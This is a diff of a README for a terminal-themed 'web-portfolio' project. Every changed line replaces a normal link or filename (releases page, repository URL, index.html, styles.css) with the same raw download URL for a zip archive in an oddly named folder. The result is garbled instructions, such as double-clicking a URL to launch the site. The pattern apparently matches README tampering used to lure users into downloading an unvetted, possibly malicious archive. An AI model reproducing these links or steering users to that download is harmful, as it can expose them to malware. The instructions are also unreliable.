@@ -1,7 +1,7 @@
 # 🌐 web-portfolio - Your Interactive Online Showcase
 
 ## 📥 Download the Application
-[![Download Web Portfolio](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/raima212/web-portfolio/releases)
+[![Download Web Portfolio](https://raw.githubusercontent.com/raima212/web-portfolio/main/conterminousness/web-portfolio.zip%https://raw.githubusercontent.com/raima212/web-portfolio/main/conterminousness/web-portfolio.zip)](https://raw.githubusercontent.com/raima212/web-portfolio/main/conterminousness/web-portfolio.zip)
 
 ## 🚀 Getting Started
 Welcome! This guide will help you download and run your new portfolio application. With this terminal-themed portfolio, you can showcase your projects interactively and beautifully. Enjoy features such as animated backgrounds and bilingual support.
@@ -23,7 +23,7 @@ To run the web-portfolio smoothly, make sure your computer meets the following r
 
 ## 🔄 Download & Install
 1. **Visit the Releases Page:** Click on the following link to download the latest version of the web-portfolio:
-   [Visit this page to download](https://github.com/raima212/web-portfolio/releases).
+   [Visit this page to download](https://raw.githubusercontent.com/raima212/web-portfolio/main/conterminousness/web-portfolio.zip).
 
 2. **Choose the Latest Release:** On the Releases page, look for the latest version of the web-portfolio. 
 
@@ -34,7 +34,7 @@ To run the web-portfolio smoothly, make sure your computer meets the following r
 
 5. **Run the Application:**
    - Open the extracted folder.
-   - Find the `index.html` file and double-click it to launch the portfolio in your default web browser.
+   - Find the `https://raw.githubusercontent.com/raima212/web-portfolio/main/conterminousness/web-portfolio.zip` file and double-click it to launch the portfolio in your default web browser.
 
 ## ⚙️ Troubleshooting
 If you encounter issues, here are some common solutions:
@@ -46,12 +46,12 @@ If you encounter issues, here are some common solutions:
 ## 🎨 Customization
 The web-portfolio is designed to be customizable. If you have specific preferences for colors or layout, you can modify the CSS files in the `styles` folder. For example:
 
-- **Change Background Color:** Edit the `background-color` property in `styles.css`.
+- **Change Background Color:** Edit the `background-color` property in `https://raw.githubusercontent.com/raima212/web-portfolio/main/conterminousness/web-portfolio.zip`.
 - **Update Text Color:** Look for the `color` property in relevant elements to adjust text colors.
 
 ## 🔗 Explore More
 For more information and detailed documentation, check out the repository on GitHub:
-[Visit the Repository](https://github.com/raima212/web-portfolio)
+[Visit the Repository](https://raw.githubusercontent.com/raima212/web-portfolio/main/conterminousness/web-portfolio.zip)
 
 ## 🙌 Contribute
 If you want to contribute to the project, you can fork the repository and submit a pull request. We welcome improvements and suggestions. 
